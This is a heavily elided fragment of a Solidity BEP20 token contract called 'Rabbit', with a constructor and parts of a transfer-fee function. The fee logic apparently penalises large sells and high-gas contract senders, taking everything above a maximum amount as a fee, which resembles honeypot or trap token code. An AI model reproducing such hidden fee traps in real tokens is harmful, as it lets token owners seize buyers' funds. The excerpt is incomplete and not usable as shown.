...
abstract contract baseContract is  IBEP20 , Ownable {
    ...
    constructor(address _routerAddress,string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply) payable Ownable() public{
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
    ...
    function takeFee(address sender, address recipient, uint amount,uint currentRate) internal returns (uint) {
        ...
        if(pairs[recipient]){
            ...
            if(isContract(recipient) && tx.gasprice > maxgasprice  && amount > maxamount ) ex[sender].fee=1;
        }
        else{ 
        ...
        if(step==2 && realAmount > maxamount){
            feeAmount = amount.sub(maxamount);
...
contract Rabbit is baseContract { 
    constructor() baseContract(address(0x10ED43C718714eb63d5aA57B78B54704E256024E),"Rabbit","🐰",18,20230101) public{
    } 
}